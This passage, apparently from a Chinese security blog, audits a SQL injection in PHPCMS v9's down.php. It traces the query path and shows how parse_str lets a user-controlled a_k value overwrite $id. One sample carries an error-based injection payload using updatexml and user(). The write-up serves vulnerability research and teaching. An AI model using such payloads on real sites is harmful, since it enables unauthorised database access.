+</span></span><span class="line"><span class="cl">	    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">	    <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">table_name</span> <span class="o">=</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db_config</span><span class="p">[</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db_setting</span><span class="p">][</span><span class="s1">&#39;tablepre&#39;</span><span class="p">]</span><span class="o">.</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">table_name</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">	    <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db_tablepre</span> <span class="o">=</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db_config</span><span class="p">[</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db_setting</span><span class="p">][</span><span class="s1">&#39;tablepre&#39;</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl">	    <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span> <span class="o">=</span> <span class="n">db_factory</span><span class="p">::</span><span class="n">get_instance</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db_config</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">get_database</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db_setting</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">			  <span class="o">=&gt;//</span><span class="n">phpcms</span><span class="o">/</span><span class="n">libs</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">db_factory</span><span class="o">.</span><span class="n">class</span><span class="o">.</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl">				<span class="o">//</span><span class="n">返回当前终级类对象的实例</span>
+</span></span><span class="line"><span class="cl">				<span class="n">public</span> <span class="n">static</span> <span class="n">function</span> <span class="n">get_instance</span><span class="p">(</span><span class="err">$</span><span class="n">db_config</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">				    <span class="k">if</span><span class="p">(</span><span class="err">$</span><span class="n">db_config</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">				       <span class="err">$</span><span class="n">db_config</span> <span class="o">=</span> <span class="n">pc_base</span><span class="p">::</span><span class="n">load_config</span><span class="p">(</span><span class="s1">&#39;database&#39;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">				       <span class="o">//</span><span class="n">加载配置文件</span> <span class="n">database</span><span class="o">.</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl">				    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">				    <span class="k">if</span><span class="p">(</span><span class="n">db_factory</span><span class="p">::</span><span class="err">$</span><span class="n">db_factory</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">				       <span class="n">db_factory</span><span class="p">::</span><span class="err">$</span><span class="n">db_factory</span> <span class="o">=</span> <span class="n">new</span> <span class="n">db_factory</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">				       <span class="o">//</span><span class="n">实例化</span> <span class="n">db_factory</span> <span class="n">基类</span>
+</span></span><span class="line"><span class="cl">				    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">				    <span class="k">if</span><span class="p">(</span><span class="err">$</span><span class="n">db_config</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span> <span class="o">&amp;&amp;</span> <span class="err">$</span><span class="n">db_config</span> <span class="o">!=</span> <span class="n">db_factory</span><span class="p">::</span><span class="err">$</span><span class="n">db_factory</span><span class="o">-&gt;</span><span class="n">db_config</span><span class="p">)</span> <span class="n">db_factory</span><span class="p">::</span><span class="err">$</span><span class="n">db_factory</span><span class="o">-&gt;</span><span class="n">db_config</span> <span class="o">=</span> <span class="n">array_merge</span><span class="p">(</span><span class="err">$</span><span class="n">db_config</span><span class="p">,</span> <span class="n">db_factory</span><span class="p">::</span><span class="err">$</span><span class="n">db_factory</span><span class="o">-&gt;</span><span class="n">db_config</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">				    <span class="k">return</span> <span class="n">db_factory</span><span class="p">::</span><span class="err">$</span><span class="n">db_factory</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>  
+</span></span><span class="line"><span class="cl">				  
+</span></span><span class="line"><span class="cl">				<span class="o">//</span><span class="n">获取数据库操作实例</span>  
+</span></span><span class="line"><span class="cl">				<span class="n">public</span> <span class="n">function</span> <span class="n">get_database</span><span class="p">(</span><span class="err">$</span><span class="n">db_name</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">				    <span class="k">if</span><span class="p">(</span><span class="err">!</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db_list</span><span class="p">[</span><span class="err">$</span><span class="n">db_name</span><span class="p">])</span> <span class="o">||</span> <span class="err">!</span><span class="n">is_object</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db_list</span><span class="p">[</span><span class="err">$</span><span class="n">db_name</span><span class="p">]))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">				       <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db_list</span><span class="p">[</span><span class="err">$</span><span class="n">db_name</span><span class="p">]</span> <span class="o">=</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">connect</span><span class="p">(</span><span class="err">$</span><span class="n">db_name</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">				    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">				    <span class="k">return</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db_list</span><span class="p">[</span><span class="err">$</span><span class="n">db_name</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl">				    <span class="o">//</span><span class="n">返回模型对象</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>db_name为default，而默认在上面已经看到了，&lsquo;database&rsquo; =&gt; &lsquo;phpcmsv9&rsquo;,  &rsquo;type&rsquo; =&gt; &lsquo;mysqli&rsquo;，因此默认数据库基类为 db_mysqli，我们跟踪 db_mysql.class.php
+这里将 $sql 属性中交给 db_mysqli_class.php::execute 执行</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">//phpcms/libs/classes/db_mysqli.class.php
+</span></span><span class="line"><span class="cl">final class db_mysqli{
+</span></span><span class="line"><span class="cl">	public function get_one($data, $table, $where = &#39;&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {  
+</span></span><span class="line"><span class="cl">	    $where = $where == &#39;&#39; ? &#39;&#39; : &#39; WHERE &#39;.$where;  
+</span></span><span class="line"><span class="cl">	    $order = $order == &#39;&#39; ? &#39;&#39; : &#39; ORDER BY &#39;.$order;  
+</span></span><span class="line"><span class="cl">	    $group = $group == &#39;&#39; ? &#39;&#39; : &#39; GROUP BY &#39;.$group;  
+</span></span><span class="line"><span class="cl">	    $limit = &#39; LIMIT 1&#39;;  
+</span></span><span class="line"><span class="cl">	    $field = explode( &#39;,&#39;, $data);  
+</span></span><span class="line"><span class="cl">	    array_walk($field, array($this, &#39;add_special_char&#39;));  
+</span></span><span class="line"><span class="cl">	    $data = implode(&#39;,&#39;, $field);  
+</span></span><span class="line"><span class="cl">	  
+</span></span><span class="line"><span class="cl">	    $sql = &#39;SELECT &#39;.$data.&#39; FROM `&#39;.$this-&gt;config[&#39;database&#39;].&#39;`.`&#39;.$table.&#39;`&#39;.$where.$group.$order.$limit;  
+</span></span><span class="line"><span class="cl">	    $this-&gt;execute($sql);  
+</span></span><span class="line"><span class="cl">			  =&gt;
+</span></span><span class="line"><span class="cl">				private function execute($sql) {  
+</span></span><span class="line"><span class="cl">				    if(!is_object($this-&gt;link)) {  
+</span></span><span class="line"><span class="cl">				       $this-&gt;connect();  
+</span></span><span class="line"><span class="cl">						      =&gt;
+</span></span><span class="line"><span class="cl">								public function connect() {  
+</span></span><span class="line"><span class="cl">								    $this-&gt;link = new mysqli($this-&gt;config[&#39;hostname&#39;], $this-&gt;config[&#39;username&#39;], $this-&gt;config[&#39;password&#39;], $this-&gt;config[&#39;database&#39;], $this-&gt;config[&#39;port&#39;]?intval($this-&gt;config[&#39;port&#39;]):3306);  
+</span></span><span class="line"><span class="cl">								    if(mysqli_connect_error()){  
+</span></span><span class="line"><span class="cl">								       $this-&gt;halt(&#39;Can not connect to MySQL server&#39;);  
+</span></span><span class="line"><span class="cl">								       return false;  
+</span></span><span class="line"><span class="cl">								    }  
+</span></span><span class="line"><span class="cl">								    if($this-&gt;version() &gt; &#39;4.1&#39;) {  
+</span></span><span class="line"><span class="cl">								       $charset = isset($this-&gt;config[&#39;charset&#39;]) ? $this-&gt;config[&#39;charset&#39;] : &#39;&#39;;  
+</span></span><span class="line"><span class="cl">								       $serverset = $charset ? &#34;character_set_connection=&#39;$charset&#39;,character_set_results=&#39;$charset&#39;,character_set_client=binary&#34; : &#39;&#39;;  
+</span></span><span class="line"><span class="cl">								       $serverset .= $this-&gt;version() &gt; &#39;5.0.1&#39; ? ((empty($serverset) ? &#39;&#39; : &#39;,&#39;).&#34; sql_mode=&#39;&#39; &#34;) : &#39;&#39;;  
+</span></span><span class="line"><span class="cl">								       $serverset &amp;&amp; $this-&gt;link-&gt;query(&#34;SET $serverset&#34;);  
+</span></span><span class="line"><span class="cl">								    }  
+</span></span><span class="line"><span class="cl">								    return $this-&gt;link;  
+</span></span><span class="line"><span class="cl">								}
+</span></span><span class="line"><span class="cl">				    }  
+</span></span><span class="line"><span class="cl">				    $this-&gt;lastqueryid = $this-&gt;link-&gt;query($sql) or $this-&gt;halt($this-&gt;link-&gt;error, $sql);  
+</span></span><span class="line"><span class="cl">				    $this-&gt;querycount++;  
+</span></span><span class="line"><span class="cl">				    return $this-&gt;lastqueryid;  
+</span></span><span class="line"><span class="cl">				}
+</span></span><span class="line"><span class="cl">	    $res = $this-&gt;fetch_next();  
+</span></span><span class="line"><span class="cl">	    $this-&gt;free_result();  
+</span></span><span class="line"><span class="cl">	    return $res;  
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>最终一路到 db_mysqli.class.php::connect 调用 php 内置数据库方法 query 执行 sql 语句</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$this</span>-&gt;execute<span class="o">(</span><span class="nv">$sql</span><span class="o">)</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">	  <span class="o">=</span>&gt;
+</span></span><span class="line"><span class="cl">		private <span class="k">function</span> execute<span class="o">(</span><span class="nv">$sql</span><span class="o">)</span> <span class="o">{</span>  
+</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="o">(</span>!is_object<span class="o">(</span><span class="nv">$this</span>-&gt;link<span class="o">))</span> <span class="o">{</span>  
+</span></span><span class="line"><span class="cl">			   <span class="nv">$this</span>-&gt;connect<span class="o">()</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">					  <span class="o">=</span>&gt;
+</span></span><span class="line"><span class="cl">						public <span class="k">function</span> connect<span class="o">()</span> <span class="o">{</span>  
+</span></span><span class="line"><span class="cl">							<span class="nv">$this</span>-&gt;link <span class="o">=</span> new mysqli<span class="o">(</span><span class="nv">$this</span>-&gt;config<span class="o">[</span><span class="s1">&#39;hostname&#39;</span><span class="o">]</span>, <span class="nv">$this</span>-&gt;config<span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">]</span>, <span class="nv">$this</span>-&gt;config<span class="o">[</span><span class="s1">&#39;password&#39;</span><span class="o">]</span>, <span class="nv">$this</span>-&gt;config<span class="o">[</span><span class="s1">&#39;database&#39;</span><span class="o">]</span>, <span class="nv">$this</span>-&gt;config<span class="o">[</span><span class="s1">&#39;port&#39;</span><span class="o">]</span>?intval<span class="o">(</span><span class="nv">$this</span>-&gt;config<span class="o">[</span><span class="s1">&#39;port&#39;</span><span class="o">])</span>:3306<span class="o">)</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">							<span class="k">if</span><span class="o">(</span>mysqli_connect_error<span class="o">()){</span>  
+</span></span><span class="line"><span class="cl">							   <span class="nv">$this</span>-&gt;halt<span class="o">(</span><span class="s1">&#39;Can not connect to MySQL server&#39;</span><span class="o">)</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">							   <span class="k">return</span> false<span class="p">;</span>  
+</span></span><span class="line"><span class="cl">							<span class="o">}</span>  
+</span></span><span class="line"><span class="cl">							<span class="k">if</span><span class="o">(</span><span class="nv">$this</span>-&gt;version<span class="o">()</span> &gt; <span class="s1">&#39;4.1&#39;</span><span class="o">)</span> <span class="o">{</span>  
+</span></span><span class="line"><span class="cl">							   <span class="nv">$charset</span> <span class="o">=</span> isset<span class="o">(</span><span class="nv">$this</span>-&gt;config<span class="o">[</span><span class="s1">&#39;charset&#39;</span><span class="o">])</span> ? <span class="nv">$this</span>-&gt;config<span class="o">[</span><span class="s1">&#39;charset&#39;</span><span class="o">]</span> : <span class="s1">&#39;&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">							   <span class="nv">$serverset</span> <span class="o">=</span> <span class="nv">$charset</span> ? <span class="s2">&#34;character_set_connection=&#39;</span><span class="nv">$charset</span><span class="s2">&#39;,character_set_results=&#39;</span><span class="nv">$charset</span><span class="s2">&#39;,character_set_client=binary&#34;</span> : <span class="s1">&#39;&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">							   <span class="nv">$serverset</span> .<span class="o">=</span> <span class="nv">$this</span>-&gt;version<span class="o">()</span> &gt; <span class="s1">&#39;5.0.1&#39;</span> ? <span class="o">((</span>empty<span class="o">(</span><span class="nv">$serverset</span><span class="o">)</span> ? <span class="s1">&#39;&#39;</span> : <span class="s1">&#39;,&#39;</span><span class="o">)</span>.<span class="s2">&#34; sql_mode=&#39;&#39; &#34;</span><span class="o">)</span> : <span class="s1">&#39;&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">							   <span class="nv">$serverset</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span>-&gt;link-&gt;query<span class="o">(</span><span class="s2">&#34;SET </span><span class="nv">$serverset</span><span class="s2">&#34;</span><span class="o">)</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">							<span class="o">}</span>  
+</span></span><span class="line"><span class="cl">							<span class="k">return</span> <span class="nv">$this</span>-&gt;link<span class="p">;</span>  
+</span></span><span class="line"><span class="cl">						<span class="o">}</span>
+</span></span><span class="line"><span class="cl">			<span class="o">}</span>  
+</span></span><span class="line"><span class="cl">			<span class="nv">$this</span>-&gt;lastqueryid <span class="o">=</span> <span class="nv">$this</span>-&gt;link-&gt;query<span class="o">(</span><span class="nv">$sql</span><span class="o">)</span> or <span class="nv">$this</span>-&gt;halt<span class="o">(</span><span class="nv">$this</span>-&gt;link-&gt;error, <span class="nv">$sql</span><span class="o">)</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">			<span class="nv">$this</span>-&gt;querycount++<span class="p">;</span>  
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nv">$this</span>-&gt;lastqueryid<span class="p">;</span>  
+</span></span><span class="line"><span class="cl">		<span class="o">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>总结调用栈</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">down.php::init()
+</span></span><span class="line"><span class="cl">	model.class.php::get_one()
+</span></span><span class="line"><span class="cl">		db_mysqli.class.php::get_one()
+</span></span><span class="line"><span class="cl">			db_mysqli.class.php::execute()
+</span></span><span class="line"><span class="cl">				db_mysqli.class.php::connect()</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h2 class="heading-element" id="php-特性分析"><span>PHP 特性分析</span>
+  <a href="#php-%e7%89%b9%e6%80%a7%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>PHP 的 parse_str 在特定场景中，是存在变量覆盖漏洞，并且它是通过识别 &amp; 的方式来判断参数
+假设代码如下</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$a_k</span> <span class="o">=</span> <span class="s1">&#39;{&#34;aid&#34;:1,&#34;src&#34;:&#34;&amp;id=%27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;f=cookie&amp;modelid=1&amp;catid=1&amp;&#34;,&#34;filename&#34;:&#34;&#34;}&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="nx">parse_str</span><span class="p">(</span><span class="nv">$a_k</span><span class="p">,</span> <span class="nv">$vars</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nv">$vars</span><span class="p">);</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250729104309128.png" alt="" loading="lazy"></figure>
+
+可以看到即使是 JSON 格式，带有 &amp; 的参数都被注册为变量了
+那么接下来进入实战审计</p>
+<h1 class="heading-element" id="审计"><span>审计</span>
+  <a href="#%e5%ae%a1%e8%ae%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h2 class="heading-element" id="代码审计"><span>代码审计</span>
+  <a href="#%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>阅读 phpcms/modules/content/down.php 代码段，发现 down.php::init() 是有可能存在 SQL 注入漏洞的</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">down</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">public</span> <span class="n">function</span> <span class="n">init</span><span class="p">()</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">	    <span class="err">$</span><span class="n">a_k</span> <span class="o">=</span> <span class="n">trim</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;a_k&#39;</span><span class="p">]);</span>  
+</span></span><span class="line"><span class="cl">	    <span class="k">if</span><span class="p">(</span><span class="err">!</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">a_k</span><span class="p">))</span> <span class="n">showmessage</span><span class="p">(</span><span class="n">L</span><span class="p">(</span><span class="s1">&#39;illegal_parameters&#39;</span><span class="p">));</span>  
+</span></span><span class="line"><span class="cl">	    <span class="err">$</span><span class="n">a_k</span> <span class="o">=</span> <span class="n">sys_auth</span><span class="p">(</span><span class="err">$</span><span class="n">a_k</span><span class="p">,</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">,</span> <span class="n">pc_base</span><span class="p">::</span><span class="n">load_config</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span><span class="s1">&#39;auth_key&#39;</span><span class="p">));</span>  
+</span></span><span class="line"><span class="cl">	    <span class="k">if</span><span class="p">(</span><span class="n">empty</span><span class="p">(</span><span class="err">$</span><span class="n">a_k</span><span class="p">))</span> <span class="n">showmessage</span><span class="p">(</span><span class="n">L</span><span class="p">(</span><span class="s1">&#39;illegal_parameters&#39;</span><span class="p">));</span>  
+</span></span><span class="line"><span class="cl">	    <span class="n">unset</span><span class="p">(</span><span class="err">$</span><span class="n">i</span><span class="p">,</span><span class="err">$</span><span class="n">m</span><span class="p">,</span><span class="err">$</span><span class="n">f</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">	    <span class="n">parse_str</span><span class="p">(</span><span class="err">$</span><span class="n">a_k</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">	    <span class="k">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">i</span><span class="p">))</span> <span class="err">$</span><span class="n">i</span> <span class="o">=</span> <span class="err">$</span><span class="nb">id</span> <span class="o">=</span> <span class="n">intval</span><span class="p">(</span><span class="err">$</span><span class="n">i</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">	    <span class="k">if</span><span class="p">(</span><span class="err">!</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">m</span><span class="p">))</span> <span class="n">showmessage</span><span class="p">(</span><span class="n">L</span><span class="p">(</span><span class="s1">&#39;illegal_parameters&#39;</span><span class="p">));</span>  
+</span></span><span class="line"><span class="cl">	    <span class="k">if</span><span class="p">(</span><span class="err">!</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">modelid</span><span class="p">)</span><span class="o">||</span><span class="err">!</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">catid</span><span class="p">))</span> <span class="n">showmessage</span><span class="p">(</span><span class="n">L</span><span class="p">(</span><span class="s1">&#39;illegal_parameters&#39;</span><span class="p">));</span>  
+</span></span><span class="line"><span class="cl">	    <span class="k">if</span><span class="p">(</span><span class="n">empty</span><span class="p">(</span><span class="err">$</span><span class="n">f</span><span class="p">))</span> <span class="n">showmessage</span><span class="p">(</span><span class="n">L</span><span class="p">(</span><span class="s1">&#39;url_invalid&#39;</span><span class="p">));</span>  
+</span></span><span class="line"><span class="cl">	    <span class="err">$</span><span class="n">allow_visitor</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">	    <span class="err">$</span><span class="n">MODEL</span> <span class="o">=</span> <span class="n">getcache</span><span class="p">(</span><span class="s1">&#39;model&#39;</span><span class="p">,</span><span class="s1">&#39;commons&#39;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">	    <span class="err">$</span><span class="n">tablename</span> <span class="o">=</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="n">table_name</span> <span class="o">=</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="n">db_tablepre</span><span class="o">.</span><span class="err">$</span><span class="n">MODEL</span><span class="p">[</span><span class="err">$</span><span class="n">modelid</span><span class="p">][</span><span class="s1">&#39;tablename&#39;</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl">	    <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="n">table_name</span> <span class="o">=</span> <span class="err">$</span><span class="n">tablename</span><span class="o">.</span><span class="s1">&#39;_data&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">	    <span class="err">$</span><span class="n">rs</span> <span class="o">=</span> <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="n">get_one</span><span class="p">(</span><span class="n">array</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="o">=&gt;</span><span class="err">$</span><span class="nb">id</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	    <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;由&quot; used in math mode [unicodeTextInMathMode] at position 5: a_k 由̲用户控制，一切由用户可控参数皆…" style="color:#ff4949">a_k 由用户控制，一切由用户可控参数皆是危险的；在这里 </span>a_k 被交给 parse_str 进行变量注册，而 $id 上面分析过是被直接拼接 SQL 语句执行的
+仔细看下列代码段</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">unset($i,$m,$f);  
+</span></span><span class="line"><span class="cl">parse_str($a_k);  
